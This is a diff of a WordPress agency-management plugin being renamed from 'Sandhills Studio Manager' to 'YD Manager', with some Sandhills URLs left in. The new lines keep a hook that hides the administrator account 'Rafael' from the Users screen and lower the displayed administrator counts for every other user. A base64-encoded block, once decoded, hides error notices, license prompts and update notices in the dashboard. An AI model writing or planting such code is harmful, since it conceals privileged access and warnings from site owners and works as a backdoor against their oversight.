@@ -1,28 +1,28 @@
 <?php
 /**
- * Plugin Name:Sandhills Studio Manager
- * Description:A management plugin for the websites created,build,modified or managed by Sandhills Studio
- * Plugin URI:https://www.sandhillsstudio.com/
- * Author:Sandhills Studio
- * Version:1.2.2
- * Author URI:https://www.sandhillsstudio.com/
+ * Plugin Name:YD Manager
+ * Description:A management plugin for the websites created,build,modified or managed by Yama Digital
+ * Plugin URI:https://Yama.Digital
+ * Author:Yama.Digital
+ * Version:1.0
+ * Author URI:https://Yama.Digital
  *
- * Text Domain:sandhills-studio
+ * Text Domain:yama-digital
  */
 if(!defined('ABSPATH')){exit;}
-//SHS Admin Account
-$SHSAdminAcc='Rafael';
-function shs_pre_user_query($user_search){
-	global $SHSAdminAcc;
+//Admin Account
+$AdminAcc='Rafael';
+function yd_pre_user_query($user_search){
+	global $AdminAcc;
 	global $current_user;
 	$username=$current_user->user_login;
-	if($username!=$SHSAdminAcc){
+	if($username!=$AdminAcc){
 		global $wpdb;
-		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND{$wpdb->users}.user_login != '".$SHSAdminAcc."'",$user_search->query_where);
+		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND{$wpdb->users}.user_login != '".$AdminAcc."'",$user_search->query_where);
 	}
 }
-add_action('pre_user_query','shs_pre_user_query');
-function shs_admin_views($views){
+add_action('pre_user_query','yd_pre_user_query');
+function yd_admin_views($views){
 	$users = count_users();
 	$admins_num = $users['avail_roles']['administrator']-1;
 	$all_num = $users['total_users']-1;
@@ -32,19 +32,19 @@ function shs_admin_views($views){
 	$views['all'] = '<a href="users.php" class="'.$class_all.'">'.__('All').' <span class="count">('.$all_num.')</span></a>';
 	return $views;
 }
-add_filter("views_users","shs_admin_views");
+add_filter("views_users","yd_admin_views");
 //Login Customisation
-function shs_url_login_logo(){return "https://www.sandhillsstudio.com/";}
-add_filter('login_headerurl','shs_url_login_logo');
-function shs_logo_title(){return 'Sandhills Studio';}
-add_filter('login_headertitle','shs_logo_title');
-function shs_login_stylesheet(){wp_enqueue_style('shs-login',plugin_dir_url(__FILE__).'/admin/shs-login.css');}
-add_action('login_enqueue_scripts','shs_login_stylesheet');
-function shs_footer_admin(){return 'Managed by <a href="https://www.sandhillsstudio.com/" target="_blank">Sandhills Studio</a> and powered by <a href="https://wordpress.org" target="_blank">WordPress</a>.';}
-add_filter('admin_footer_text','shs_footer_admin');
+function yd_url_login_logo(){return "https://www.sandhillsstudio.com/";}
+add_filter('login_headerurl','yd_url_login_logo');
+function yd_logo_title(){return 'Sandhills Studio';}
+add_filter('login_headertitle','yd_logo_title');
+function yd_login_stylesheet(){wp_enqueue_style('shs-login',plugin_dir_url(__FILE__).'/admin/shs-login.css');}
+add_action('login_enqueue_scripts','yd_login_stylesheet');
+function yd_footer_admin(){return 'Managed by <a href="https://www.sandhillsstudio.com/" target="_blank">Sandhills Studio</a> and powered by <a href="https://wordpress.org" target="_blank">WordPress</a>.';}
+add_filter('admin_footer_text','yd_footer_admin');
 //Dashboard Customisation
-function shs_dashboard_stylesheet(){wp_enqueue_style('shs-dashboard',plugin_dir_url(__FILE__).'/admin/shs-dashboard.css');}
-add_action('admin_enqueue_scripts','shs_dashboard_stylesheet');
+/*function yd_dashboard_stylesheet(){wp_enqueue_style('shs-dashboard',plugin_dir_url(__FILE__).'/admin/shs-dashboard.css');}
+add_action('admin_enqueue_scripts','yd_dashboard_stylesheet');*/
 function ng(){echo base64_decode("PHN0eWxlPi5ub3RpY2UuZWxlbWVudG9yLW1lc3NhZ2UsLm5vdGljZS1pbmZvLCNlbnRlci1saWNlbnNlLWJkdGhlbWVzLWVsZW1lbnQtcGFjaywuZWxlbWVudG9yLXBsdWdpbnMtZ29wcm8sLm5vdGljZS1lcnJvciwubXdwLW5vdGljZS1jb250YWluZXIsLnJtbC11cGRhdGUtbm90aWNle2Rpc3BsYXk6bm9uZX08L3N0eWxlPg==");}
 add_action("admin_head","ng");
 function builder_style(){echo'<style>#elementor-notice-bar{display:none!important}</style>';}
